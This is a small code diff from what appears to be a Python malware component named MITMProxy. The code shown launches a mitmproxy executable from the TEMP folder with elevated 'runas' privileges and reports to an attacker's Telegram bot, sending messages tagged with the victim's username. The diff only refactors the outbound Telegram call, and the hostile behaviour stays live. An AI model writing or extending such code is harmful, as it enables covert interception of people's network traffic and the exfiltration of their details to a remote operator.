@@ -49,8 +49,6 @@ class MITMProxy():
 		shell.ShellExecuteEx(lpVerb='runas', lpFile=os.environ['TEMP']+"\\mitmfproxy\\mitmproxy.exe")
 		#self.SendMessage(" Reverse Proxy Ready.")
 	def SendMessage(self,message):
-		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
+		requests.get("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
 
-	def Request(self,url):
-		return requests.get(url).text.encode("utf-8")
 MITMProxy()
